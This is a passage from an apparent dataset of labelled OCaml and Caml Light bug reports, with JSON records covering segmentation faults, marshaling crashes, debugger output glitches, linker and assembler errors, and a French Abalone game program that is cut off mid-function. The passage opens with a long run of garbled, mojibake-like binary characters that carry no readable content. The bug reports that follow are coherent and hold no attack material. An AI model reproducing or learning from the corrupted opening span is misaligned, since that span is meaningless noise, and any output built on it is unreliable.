QÂ²â°\u0006ÂµÂ²â°\u000fÃÃÂ²YÂ»Â®?âMz\u0007ZÃ&\rÂ¦J6i/NâÃÃªCÂ¤âM\u001aÂ¹?lÃ¢`jdânEÃ©Â²Ã\u000e\u0019Â²â¦xÂ¯]Å½zâ¢ÃÃµS\u0002=Ã¿ÃªÃÂ¤NÃÅ½\u00192dâ-dâ-Ã´â¬â°v7\u0000Â·CÃ;Ã¿RÃÃ·Â»ÂµâM4Â¨â¢MÃ¸N?lÃAÃ³eÂ³\u0015Y\u0003+âºÂ°\u0006N6Ã¡t9ÃÂ¤5HâÃÂ¶Ã\u001aXÃÂ¤Ã?âM8Â¨âMZÃtÃlÃÃ@Ã&Â­?âM8Â¨âMZâlÃlÃÃ¸\u0018ÃÃ-ââÃ·ÃÃ³%Ã¶ÃÅ¸Ã¡Â¢MÃ³\u001b6\u0007âCL6Ã±ÃºÃâÃÃuÂ«rÂ²\tÂ§ÃÃ&ÃLâlÃ\u001aÂ¤Ãf\u001bÃ¡ÃÃ§d\u0013\u000eÃªd\u0013wÂ®dÃÃ\u001fÂºÃ8ÃÂ¤Ã­@Ã&}Â§J6Ã©q?]6Ã·C4ÃÂ¯?Ã¿uÂ¾xÃ»Ã°Ã»Ã¦?.ÃÃ¤ÃÂ«mÃÂ²Â²Â¹ÃÂ¸ee\u0013_WF6Ã¡JqÂ²\t\u0007ÃâÃÃÃ-'âºÂ¸Ã\u0018ÃÂ¤âWÃ&\u001cÃ´\u0016ÃÃ}Ã¢rÂ²â°SÂ¯âMz>QÂ²I?sÃ©Â²Â¹_H\\J6Ã©vÂ¤d\u0013\u0017ÃÃ&Â½Ã³?.âºÃ»!sÃ­Â¡ÃÂµâ¡2W\u000feÂ®~wÃ¦ÃwpSÂ²\t[?âMÂ¸ÂªÅlÃ¢];[6wÅ¸Ã¾ÅlÃ\u001b4J6ÃÂ V6Ã±Ã¡9[6Ã·Â¡kÃ dâÃ?VÂ²IÆÂ©âMÃâ¹ÃeÂ³Ã»\u0010Ã©dâFn#âº8Ë\u001aÃÂ¤[QÂºlÃ¶Câ Ã¬!ÃÃ«ÃÅ¸Â£^Ã¦ÃÃºâ@ÃÂ¿z4Â©\u0013Ã¶câ \fÃd\u000fÃd\u000f=`Â¢Ã\rÃÃ½\u0015Ã³ÃÃ¹âzÂ¾ÃÂ­?lÂ²AÂ¥lÃwÂªdâ\u000eÅ¡/âº}â5?Â²IkÂ dâNââM\\ÆtÃÃ¬UÃ@Ã&Â¾\u000eÅlÃAâ¢lÃ¢ÃÂ¦ÃfoÂ¾\u0006F6q\rÅlÃA?lÃ¢\u0012dÃf?ÃÃPN\u001eÂ¡Å<.Ã§Ã¤Â·W_Ã¾\f\u0017mÅ¡Ã§6GâCH6Ã¹ÃºÃâÃ>tÂ«RÂ²IÂ§OÃ&ÃLÅlÃ\u001aÂ¤ÃÃ¦xâ\u0017Å¸âM:Â¨âMÃÂ¹âes,ÂºÃ(ÃÃÃ­ÃÃ&~Â§F6Ã±q?]6Ã!Å¡?Ã«Ã?/Â®\u001f~ÃÃ¼Ãeâº|{Âµ?[V6â¡?[R6Ã¹u%dâÂ®\u0014%âºtÃ|Ã\u001c>n)ÃÃ¤Ã­FÃ&Å½Â¼F6Ã©Â Â·ÃÃ¦Ã°â°KÃ&OÂ½B6Ã±Ã¹ÃÃ&>ÃÂ¥ÃÃ¦Â¸?Â¸ÅlÃ¢Ã­ÃÃ&/Â¬?M|Ã§!]6Ã!s?HÃ¦*?HÃ¦*?HÃ¦*?Â»3ÃÃ¨Ã¾Ã fdâÂ¶\u0002%âºtU)ÃÃ¤Â»vÂ¶l\u000eÅ¸Ã¾âlÃ¢\u001b4F6ÃÂ R6Ã¹Ã¡9Y6Ã§EÂ®kÂ d\u0013Ã?6Â²â°ÆÂ©âMÃâ¹Â³esnâ¢z/RÂ²â°#Â·?M\u001eLâ¦lÃ¢Â­([6gÂ¿9â Ã{Ã¥qÃ½9ÃªÂ¥,Å¸>[[ÃÂ¿z4Â§\u0013Ã9?Ã¼Ã\n"},{"labels":["bug",null],"text":"**Original bug ID:** 1497\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** -for Caml light use https://github.com/camllight/camllight/issues\n\n## Bug description\n\nFull_Name: Kwanghoon Choi\nVersion: Caml light 0.75\nOS: SunOS 5.8\nSubmission from: dol.kaist.ac.kr (143.248.135.109)\n\n\n\nHi,\n\nI am a newcomer to the Caml light system. I found a weird example\nthat went through the typing process of the system but got stuck\nby a segmentation fault error in running, as follows:\n\n---------------------------------------------------------------\n$ cat nil.ml\n\ntype T = MyC of T * T * T * T * T * T\n           | YourC ;;\n\nlet rec x =\n         let (MyC (z1,z2,z3,z4,z5,z))=x in\n          MyC(x,z,z1,z2,z3,z4);;\n\n\n$ camllight\n>       Caml Light version 0.75\n\n#load \"nil.ml\";;\nType T defined.\nFile \"nil.ml\", line 6-7, characters 2-60:\n>       .let (MyC (z1,z2,z3,z4,z5,z))=x in\n>         MyC(x,z,z1,z2,z3,z4)..\nWarning: this matching is not exhaustive.\nSegmentation fault\n--------------------------------------------------------------\n\nIn order to examine this behavior further, I looked into the\nZINC bytecode for the caml code. I am not sure but the ZINC\nbytecode seems to be strange.\n\n* DUMMY allocates one empty block with a tag 0.\n* SWITCH interprets this empty block as a block with the\n  constructor MyC, since the caml compiler happens to assign\n  0 to the tag of the constructor. Obviously, there is no \n  field yet in the block allocated by DUMMY.\n* GETFIELD(n), however, tries to access the non-existing fields.\n\nI am not sure that those ZINC instructions are the very\nculprit for the segmentation fault error. However, even if this\nis not the case, the generated ZINC bytecodes looks very strange to\nme anyway. Shouldn't we make the tag of the empty block to be\ndifferent from those tags of the constructors? Or, shouldn't\nwe raise an exception saying that an infinite loop is detected?\n\n--------------------------------------------------------------\n$ camlc nil.ml\n$ dumpobj nil.zo\nFile nil.zo\nOffset 4, length 56, impure\n0       DUMMY 6                     <=======\n2       SETGLOBAL 0\n5       GETGLOBAL 0\n8       LET\n9       ACC0\n10      TAGOF\n11      SWITCH 19, 46, 46,          <=======\n19      ACC0\n20      GETFIELD3                   <=======\n21      PUSH\n22      ACC0\n23      GETFIELD2                   <=======\n24      PUSH\n25      ACC0\n26      GETFIELD1                   <=======\n27      PUSH\n28      ACC0\n29      GETFIELD0                   <=======\n30      PUSH\n31      ACC0\n32      GETFIELD 5                  <=======\n34      PUSH\n35      GETGLOBAL 0\n38      MAKEBLOCK 6144\n43      BRANCH 50\n46      GETGLOBAL 0\n49      RAISE\n50      ENDLET1\n51      PUSH\n52      GETGLOBAL 0\n55      UPDATE\n        3       provide nil__x\n        6       require nil__x\n        36      require nil__x\n        47      const\n        53      require nil__x\n--------------------------------------------------------------\n\nPlease, reply to me directly. I didn't subscribe to the\nmailing lists yet.\n\nThank you for your attention.\n\nKwanghoon Choi\n"},{"labels":["bug"],"text":"**Original bug ID:** 1495\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Martin Jambon\nVersion: 3.06 (and 3.04)\nOS: i386-Linux (kernel 2.2.20 and 2.4.9)\nSubmission from: pc-bioinfo1.ibcp.fr (193.51.160.63)\n\n\nThe following program ends with Segmentation fault, with ocaml, ocamlc\nand ocamlopt on i386/Linux:\n\n(***************** START ***********************)\ntype t = { id : int;\n\t   mutable next : t list }\n\nlet create_chain number_of_cells =\n  let rec loop cell i =\n    let new_cell = { id = i;\n\t\t     next = [cell] } in\n    if i = 0 then new_cell\n    else loop new_cell (pred i) in\n  let rec first = { id = 0;\n\t\t    next = [] } in\n  let last = loop first number_of_cells in\n  last\n\nlet create_data () =\n  Array.init\n    60000\n    (fun _ -> create_chain 10)\n\nlet test_data () =\n  let data = create_data () in\n  let s = Marshal.to_string data [] in\n  ignore (Marshal.from_string s 0)\n\nlet _ =\n  Gc.set { (Gc.get ()) with Gc.verbose = 0x010 };\n  test_data ();\n  Gc.compact ()\n(************************** END OF PROGRAM *******************************)\n\n\nThis problem occurs when large data are loaded using input_value or\nMarshal.from_* functions.\nThe parameter size of the array (60000) may be changed to some other\nclose value with different results. Here, \"+\" indicates successful exit\n(0) and \"-\" indicates segmentation fault:\n\n59990 +\n59991 -\n59992 -\n59993 +\n59994 -\n59995 -\n59996 +\n59997 -\n59998 -\n59999 +\n60000 -\n\nThe problem doesn't seem to appear with values below 59900.\n\noutput_value followed input_value regenerates an identical file.\nThe data produced by input_value seems correct but causes malfunctions\nduring heap compactions. Whether the compactions are automatically\ntriggered (in OCaml 3.06) or not does not change the result. The\nfollowing code will crash during an automatic heap compaction (when i = 2):\n\nlet _ =\n  Gc.set { (Gc.get ()) with Gc.verbose = 0x010 };\n  for i = 1 to 10; do\n    print_int i; print_newline ();\n    test_data ()\n  done\n\nIn practice, I have files containing large and complex marshaled data,\nand the crash occurs when the size of the marshaled result (file)\nexceeds 10MB (5 out of 2000 tested cases).\n"},{"labels":["bug"],"text":"**Original bug ID:** 1494\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: George Necula\nVersion: 3.06\nOS: Windows XP\nSubmission from: raw.cs.berkeley.edu (128.32.153.230)\n\n\nThe following program segfaults (both on Windows XP and on linux, both in the\ninterpreter and in the compiled versions):\n\nclose_out stderr\nPrintexc.catch (fun _ -> raise (Failure \"test\")) ()\n"},{"labels":["bug"],"text":"**Original bug ID:** 1492\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBelieve it or not, the trailing dot in the \"Node:\" line of the file\nocaml.info-1 in the ocaml-3.06-refman.info.tar causes problems.\n\nWith the original line, \n\n   Node: Top,\tNext: Part I,\tUp: (dir).\n\nwhen I hit \"u\" from the top level ocaml info page, in order to return\nto my info directory, I get an error, \"No such anchor in tag table or\nnode in tag table or file: .\".  When the dot is removed:\n\n   Node: Top,\tNext: Part I,\tUp: (dir)\n\nit works, and I can return up to my info directory.\n\nI'm running emacs 21.2.1.  The entry in my info dir file is:\n\n  * OCAML: (ocaml) .       The OCAML Programming Language\n\nTrivial, but annoying.\nThanks.\n-- \nGreg      gregs@ai.mit.edu (617)253-5807\nSullivan  http://www.ai.mit.edu/~gregs/\n"},{"labels":["bug"],"text":"**Original bug ID:** 1491\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nau moins dans 'caml-font, il highlighte les constructions de la forme\n\"ident:\" comme des labels (un reste de la version 2.99 je crois, ou il\nn'y avait pas le ~ devant les labels). Je n'ai pas verifie avec\n'caml-hilit.\n\nEvidemment, du coup, ca pose probleme pour les declarations de types, ou\nle ~ n'apparait pas...\n"},{"labels":["bug"],"text":"**Original bug ID:** 1489\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Andy Chou\nVersion: 3.06\nOS: Linux\nSubmission from: 216.100.136.162 (216.100.136.162)\n\n\nI have a long-running process that occassionally dies with a seg fault.  It's\nnot reproducible consistently, but it always happens when the process is run\nlong enough.  It dumps core.  I can send a binary and a core dump, if that would\nhelp.  Here's the backtrace the core file gives in gdb:\n\n#0  chunk_free (ar_ptr=0xb2, p=0x2c393030) at malloc.c:3049\n#1  0x2ab41f9a in __libc_free (mem=0x2c393038) at malloc.c:3023\n#2  0x809389c in re_free ()\n#3  0x808de33 in free_regexp ()\n#4  0x8094bc9 in sweep_slice ()\n#5  0x8094e16 in major_collection_slice ()\n#6  0x8095451 in minor_collection ()\n#7  0x80954a7 in check_urgent_gc ()\n#8  0x809e1e0 in alloc_custom ()\n#9  0x808de5d in alloc_regexp ()\n#10 0x808dea5 in str_compile_regexp ()\n#11 0x8072a9d in Str__regexp_91 ()\n#12 0x2d714e8c in ?? ()\n#13 0x2d714e8c in ?? ()\n#14 0x2d7118d4 in ?? ()\nCannot access memory at address 0x1\n\nI have not tried the bytecode compiler, but I plan to soon.\n\n-Andy\n"},{"labels":["bug"],"text":"**Original bug ID:** 1488\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nsous cygwin, quand le fichier source a des retours a la ligne en style\nDOS, ca cause une syntax error.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1486\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Jacques Piotrowski\nVersion: OCMAL 3.04 \nOS: MAC OS 9.0\nSubmission from: 80.236.72.201 (80.236.72.201)\n\n\nWhen I run the command :\n\n# Unix.gethostname ;;\n\nI have the answer :\n\n Macintosh HD :Applications:ocaml-3.04-macos9:stdlib:unix.cmi\nis not a compiled interface\n# \n\nSo I can't use unix commands.\n\nPlease help me.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1484\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nThe page \n\n  http://caml.inria.fr/ocaml/htmlman/manual001.html\n\nlinks to, e.g.:\n\n  ftp://ftp.inria.fr/lang/caml-light/ocaml-3.06-refman.pdf\n\nbut\n\n  gregs@bongo:~/temp> wget ftp://ftp.inria.fr/lang/caml-light/ocaml-3.06-refman.pdf\n  --09:13:24--  ftp://ftp.inria.fr/lang/caml-light/ocaml-3.06-refman.pdf\n             => `ocaml-3.06-refman.pdf'\n  Connecting to ftp.inria.fr:21... connected!\n  Logging in as ftp ... Logged in!\n  ==> TYPE I ... done.  ==> CWD lang/caml-light ... done.\n  ==> PORT ... done.    ==> RETR ocaml-3.06-refman.pdf ... \n  No such file `ocaml-3.06-refman.pdf'.\n\n-- \nGreg      gregs@ai.mit.edu (617)253-5807\nSullivan  http://www.ai.mit.edu/~gregs/\n"},{"labels":["bug"],"text":"**Original bug ID:** 1481\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Julien Signoles\nVersion: 3.06\nOS: Linux\nSubmission from: ext2.lri.fr (129.175.15.5)\n\n\n# module X = struct type t = int end;;\nmodule X : sig type t = int end\n# module type MT = sig module A : sig end end with module A = X;;\nmodule type MT = sig module A : sig type t = int end end\n\nNormalement, il me semble que A ne devrait pas contenir le type t :\nmodule type MT = sig module A : sig end end\n"},{"labels":["bug"],"text":"**Original bug ID:** 1480\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nTo produce the bug I've used Gerd Stoplmann's Shell module, but I'm able\nto reproduce the bug also with other packages which are not part of the\nocaml distribution, actually all other external modules I've tried\nmanifest this behaviour.\n\nShell module is available at http://www.ocaml-programming.de/\n\n\n(*** File: a.ml ***)\n  ignore (Shell.command);; (* just to use an external findlib module *)\n  let foo () = prerr_endline \"Hello, world!\";;\n(*** END ***)\n\n(*** File: test.ml ***)\n  B.A.foo ();;\n(*** END ***)\n\n   $ ocamlopt -I +shell -c a.ml\n   File \"a.ml\", line 1, characters 8-21:\n   Warning: this function application is partial,\n   maybe some arguments are missing.\n\n   $ ocamlopt -pack -o b.cmx a.cmx\n\n   $ ocamlopt -o b.cmxa -a b.cmx\n\n   $ ocamlopt -I +shell str.cmxa unix.cmxa shell.cmxa b.cmxa test.ml\n   /usr/lib/ocaml/shell/shell.a(shell_sys.o)(.data+0x144): In function `Shell_sys__2':\n   : undefined reference to `caml_curry8'\n   collect2: ld returned 1 exit status\n   Error during linking\n\nCheers.\n\n-- \nStefano Zacchiroli  -  undergraduate student of CS @ Uni. Bologna, Italy\n   zack@cs.unibo.it | ICQ 33538863 | http://www.cs.unibo.it/~zacchiro\n \"I know you believe you understood what you think I said, but I am not\n sure you realize that what you heard is not what I meant!\" -- G.Romney\n"},{"labels":["bug"],"text":"**Original bug ID:** 1479\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nWhen I load a printer with an explicit path, like\n\nload_printer \"../debug_tools/printer.cma\"\n\nI cannot install any of the printers, I always get an \"Unbound identifier\".\nI have to start ocamldebug with \"-I ../debug_tools\" instead.\nI think this should either be changed or documented somewhere (in the latter \ncase load_printer might check that it can find the printer in the current \nsearch path and issue a meaningful error).\n\nYours, Florian Hars\n"},{"labels":["bug"],"text":"**Original bug ID:** 1478\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Achim Blumensath\nVersion: 3.06\nOS: Linux 2.4.18, Slackware 8.1\nSubmission from: diabolo.informatik.rwth-aachen.de (137.226.53.122)\n\n\nI tried to create a cmx file with the -pack option but got a linking error\nbecause\nthe call to objdump failed. One of the modules has the form (revised syntax):\n\nvalue table =\n[|\n\n  about 6000 records of type {int, int, option list int}\n\n|];\n\nThis caused a call to objdump with a commandline of more than 400000 bytes.\nThe corresponding location in the compiler sources includes a note (* FIXME *).\n"},{"labels":["bug"],"text":"**Original bug ID:** 1477\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour,\n\nIl me semble que certains fichier nÃ©cessaires Ã  la crÃ©ation de DLL\nutilisant les bigarrays ne sont pas installÃ©s pour le port Mingw.\n\nD'aprÃ¨s ce que j'ai compris, on a libcamlrun.a qui est une\nbibliothÃ¨que statique, ocamlrun.a la bibliothÃ¨que dynamique et\nocamlrun.dll le DLL. Les deux premiÃ¨res sont installÃ©es dans\n$OCAMLLIB, la troisiÃ¨me dans le $PATH.\n\nPar contre pour bigarray, on n'a que la lib statique dans $OCAMLLIB et\nle DLL dans $OCAMLLIB/stublibs. La lib dynamique est effacÃ©e aprÃ¨s la\ncrÃ©ation du DLL. Or, on en a besoin si on veut faire un DLL stub\nutilisant les bigarrays (pour `alloc_bigarray'), non ?\n\n-- \n   Olivier\n"},{"labels":["bug"],"text":"**Original bug ID:** 1476\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nThis looks like a missing flush somewher in the code for \"info breakpoint\" in \nthe case that there is only one breakpoint:\n\n         Objective Caml Debugger version 3.06\n\n(ocd) break @ Test_strvz 8\nLoading program... done.\nBreakpoint 1 at 136356 : file Test_strvz, line 7 column 75\n(ocd) info breakpoints\nNum    Address  Where\n(ocd) info breakpoints\n   1     136356  in Test_strvz, character 220\nNum    Address  Where\n(ocd) break @ Test_strvz 15\nBreakpoint 2 at 136132 : file Test_strvz, line 16 column 5\n(ocd) info breakpoints\n   1     136356  in Test_strvz, character 220\nNum    Address  Where\n   1     136356  in Test_strvz, character 220\n   2     136132  in Test_strvz, character 463\n\n\nYours, Florian.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1475\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Stephanie Weirich\nVersion: 3.06\nOS: Cygwin/Windows XP\nSubmission from: m561bpc1.cis.upenn.edu (158.130.12.198)\n\n\nOk, here's a weird bug.  If I reference an unknown module \"Con\", compilation\n(with either ocaml,ocamlc, or ocamlopt) hangs. When I ^C ocaml I get an error\nmesage saying that the compiled interface to this unknown module is corrupted.\n(See below.)\n\nI'm using Ocaml 3.06 that I compiled myself with Cygwin, following the\ninstallation instructions.\n\n\nmodule Foo = \n  struct \n\t let x = \"3\"\n  end\nlet _ = print_string Con.x\n\n$ ocaml example.ml\n(Now I hit ^C)\nCorrupted compiled interface con.cmi\n\n----------------------------------------\nThe thing is, it only does it for modules named \"Con\".  \n\nmodule Foo = \n  struct \n\t let x = \"3\"\n  end\nlet _ = print_string Bar.x\n\n$ ocaml example.ml\nFile \"example.ml\", line 6, characters 21-26:\nUnbound value Bar.x\n\n---------------------------------------\nAlso, creating a module named Con works.\n\nmodule Con = \n  struct \n\t let x = \"3\"\n  end\nlet _ = print_string Con.x\n\n$ ocaml example.ml\n3\n"},{"labels":["bug"],"text":"**Original bug ID:** 1474\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour Ã  tous,\n\nvoici un bug dÃ©couvert par un de mes Ã©tudiants. Il s'agit d'un problÃ¨me\nde gÃ©nÃ©ration de code assembleur.\nJe joins le source du programme qui dÃ©clenche le bug.\n\nLe message d'erreur du compilateur (en fait, de l'assembleur) est le\nsuivant:\n/tmp/camlasm1.s: Assembler messages:\n/tmp/camlasm1.s:1716: Error: suffix or operands invalid for `imul'\nAssembler error, input left in file /tmp/camlasm1.s\n\nUn coup d'oeil sur la ligne incriminÃ©e (1716)\n imull $10, 16(%esp)\nmontre qu'il s'agit effectivement d'un mode d'adressage invalide. L'IA32\naccepte que le source soit dans la pile, mais pas la destination, pour\nune multiplication entiÃ¨re.\n\nLa ligne du programme ML qui provoque ce bug est semble-t-il la ligne\n170.\n\nLe bug se produit avec les version 3.04, 3.06 ainsi que la 3.06+18\nrÃ©cupÃ©rÃ© sur le serveur CVS.\n\nLe bug disparait si l'on compile avec -unsafe...\nLes voies du compilateur OCAML sont parfois impÃ©nÃ©trables...\n\nMerci\n\n\n\n--\n|             Jean-Marc Alliot          |\n|  mailto:alliot@recherche.enac.fr      |\n|  http://www.recherche.enac.fr/~alliot |\n\n\n\n----------------\n(* ABALONE by Benny   v1.1 : classe les coups *)\n\n(***************)\n(* DEFINITIONS *)\n(***************)\n\n(* coefficients d'evaluation *)\nlet p1 = 700;;\nlet p2 = 100.;;\nlet p3 = 2;;\n\nlet print = false;;\n\n(* constantes *)\nlet tabl = Array.create_matrix 11 11 0;;\nlet prof = ref 1;;\nlet out_p = ref 0;;\nlet out_m = ref 0;;\nlet inf = 100000000;;\nlet dir_tab = [|(0,1);(1,1);(1,0);(0,-1);(-1,-1);(-1,0);(0,1);(1,1);(1,0);(0,-1);(-1,-1);(-1,0)|];;\nlet dir_x = [|0;1;1;0;-1;-1;0;1;1;0;-1;-1|];;\nlet dir_y = [|1;1;0;-1;-1;0;1;1;0;-1;-1;0|];;\nlet dir_inv = [| [|4 ; 3 ; -1|] ; [|5 ; -1 ; 2|] ; [|-1 ; 0 ; 1|] |];;\n\n(* position de depart *)\nlet init () =\n  for i=1 to 5 do tabl.(i).(1) <- 1 done; (* les noirs *)\n  for i=1 to 6 do tabl.(i).(2) <- 1 done;\n  for i=3 to 5 do tabl.(i).(3) <- 1 done;\n  for i=5 to 7 do tabl.(i).(7) <- -1 done; (* les blancs *)\n  for i=4 to 9 do tabl.(i).(8) <- -1 done;\n  for i=5 to 9 do tabl.(i).(9) <- -1 done;\n  for i=0 to 5 do tabl.(i).(0) <- 2 done; (* les cases exterieures *)\n  for i=5 to 10 do tabl.(i).(10) <- 2 done;\n  for i=1 to 5 do tabl.(0).(i) <- 2 done;\n  for i=5 to 9 do tabl.(10).(i) <- 2 done;\n  for i=1 to 4 do tabl.(i+5).(i) <- 2 done;\n  for i=1 to 4 do tabl.(i).(i+5) <- 2 done;;\n\n(* tableau d'evaluation *)\nlet eval = Array.create 4096 0;;\n\nlet rec puissance a n =\n  if n=0 then 1\n  else (a * (puissance a (n-1)));;\n\nlet eval_create =\n  for i=0 to 4095 do\n    begin\n      (* un voisin *)\n      for v=0 to 5 do\n\t(match ((i/(puissance 4 v)) mod 4) with\n\t| 0 -> (eval.(i) <- (eval.(i) + 0)) (* 0 *)\n\t| 1 -> (eval.(i) <- (eval.(i) + 1)) (* cp*)\n\t| 2 -> (eval.(i) <- (eval.(i) - 5)) (*out*)\n\t| 3 -> (eval.(i) <- (eval.(i) + 0)) (*-cp*)\n\t| _ -> () )\n      done;\n      (* deux voisins *)\n      for v=0 to 5 do\n\t(match ((i/(puissance 4 v)) mod 4) with\n\t| 1 ->\n\t    if ((i/(puissance 4 ((v+1) mod 6))) mod 4)=1 then (eval.(i) <- (eval.(i) + 1)) else (); (* ami ortho *)\n\t    if ((i/(puissance 4 ((v+2) mod 6))) mod 4)=1 then (eval.(i) <- (eval.(i) + 1)) else (); (* ami meta  *)\n\t    if ((i/(puissance 4 ((v+3) mod 6))) mod 4)=1 then (eval.(i) <- (eval.(i) + 4)) else (); (* ami para  *)\n\t| 3 ->\n\t    if ((i/(puissance 4 ((v+1) mod 6))) mod 4)=3 then (eval.(i) <- (eval.(i) + 0)) else (); (* eni ortho *)\n\t    if ((i/(puissance 4 ((v+2) mod 6))) mod 4)=3 then (eval.(i) <- (eval.(i) + 0)) else (); (* eni meta  *)\n\t    if ((i/(puissance 4 ((v+3) mod 6))) mod 4)=3 then (eval.(i) <- (eval.(i) + 2)) else (); (* eni para  *)\n\t| _ -> () )\n      done;\n    end\n  done;\n      (* six voisins *)\n  eval.(1365) <- 50;  (* 6 amis    *)\n  eval.(4095) <- 10;; (* 6 ennemis *)\n\n(* afficher la position *)\nlet print_matrix () =\n  for i=0 to 10 do\n    (match (10-i) with\n    | 0 -> print_string \"          \"\n    | 1 -> print_string \"         \"\n    | 2 -> print_string \"        \"\n    | 3 -> print_string \"       \"\n    | 4 -> print_string \"      \"\n    | 5 -> print_string \"     \"\n    | 6 -> print_string \"    \"\n    | 7 -> print_string \"   \"\n    | 8 -> print_string \"  \"\n    | 9 -> print_string \" \"\n    | 10 -> print_string \"\"\n    | _ -> () );\n    for j=0 to 10 do\n      (match tabl.(j).(10-i) with\n      |\t0 -> print_string \".\"\n      |\t-1 -> print_string \"o\"\n      |\t1 -> print_string \"+\"\n      |\t2 -> print_string \"*\"\n      |\t_ -> () );\n      print_string \" \"\n    done;\n    print_newline ()\n  done;\n  print_string \"score : \";\n  print_int !out_m;\n  print_string \" / \";\n  print_int !out_p;\n  print_newline ();;\n\n(*************)\n(* LES COUPS *)\n(*************)\n\n(* coup normalise -> code perso *)\nlet cnp coup =\n  let x1 = coup / 10000000\n  and y1 = coup / 1000000 - 10 * (coup / 10000000)\n  and x2 = coup / 100000 - 10 * (coup / 1000000)\n  and y2 = coup / 10000 - 10 * (coup / 100000)\n  and x3 = coup / 1000 - 10 * (coup / 10000)\n  and y3 = coup / 100 - 10 * (coup / 1000)\n  and x4 = coup / 10 - 10 * (coup / 100)\n  and y4 = coup - 10 * (coup / 10) in\n  if coup<10000 then (* coup en ligne *)\n    begin\n      let dx = (x4-x3) / (max 1 (abs (x4-x3)))\n      and dy = (y4-y3) / (max 1 (abs (y4-y3))) in\n      let d = dir_inv.(dx+1).(dy+1)\n      and l = max (abs (x4-x3)) (abs (y4-y3)) in\n      let mb = ref 0 in\n      while  (abs tabl.(x4 + (!mb*dx)).(y4 + (!mb*dy)) = 1) do\n\tincr mb\n      done;\n      if (tabl.(x4 + (!mb*dx)).(y4 + (!mb*dy)) = 2) then\n\t(10000 + x3*1000 + y3*100 + d*10 + l + !mb)\n      else\n\t(x3*1000 + y3*100 + d*10 + l + !mb)\n    end\n  else (* coup en fleche *)\n    begin\n      let dx = (x4-x2) / (max 1 (abs (x4-x2)))\n      and dy = (y4-y2) / (max 1 (abs (y4-y2)))\n      and vx = (x4-x3) / (max 1 (abs (x4-x3)))\n      and vy = (y4-y3) / (max 1 (abs (y4-y3))) in\n      let d = dir_inv.(dx+1).(dy+1)\n      and v = dir_inv.(vx+1).(vy+1)\n      and l = 1 + max (abs (x3-x1)) (abs (y3-y1)) in\n      ((6+v)*10000 + x1*1000 + y1*100 + d*10 + l)\n    end;;\n\n(* code perso -> coup normalise *)\nlet cpn code =\n  let v = code / 10000\n  and x = code / 1000 - 10 * (code / 10000)\n  and y = code / 100 - 10 * (code / 1000)\n  and (dx,dy) = dir_tab.(code / 10 - 10 * (code / 100))\n  and l = code - 10 * (code / 10) in\n  if v<2 then\n    match l with\n    | 5 -> (x*1000 + y*100 + (x+3*dx)*10 + (y+3*dy))\n    | 4 -> (x*1000 + y*100 + (x+3*dx)*10 + (y+3*dy))\n    | 3 ->\n\tif tabl.(x+2*dx).(y+2*dy)=tabl.(x).(y)\n\tthen (x*1000 + y*100 + (x+3*dx)*10 + (y+3*dy))\n\telse (x*1000 + y*100 + (x+2*dx)*10 + (y+2*dy))\n    | _ -> (x*1000 + y*100 + (x+l*dx)*10 + (y+l*dy))\n  else\n    let (vx,vy) = dir_tab.(v) in\n    (x*10000000 + y*1000000 + (x+vx)*100000 + (y+vy)*10000 + (x+(l-1)*dx)*1000 + (y+(l-1)*dy)*100 + (x+vx+(l-1)*dx)*10 + (y+vy+(l-1)*dy));;\n\n(* coup humain -> coup normalise *)\nlet coup_humain () =\n  let gg = ref true\n  and p1 = ref 0\n  and p2 = ref 0\n  and p3 = ref 0\n  and p4 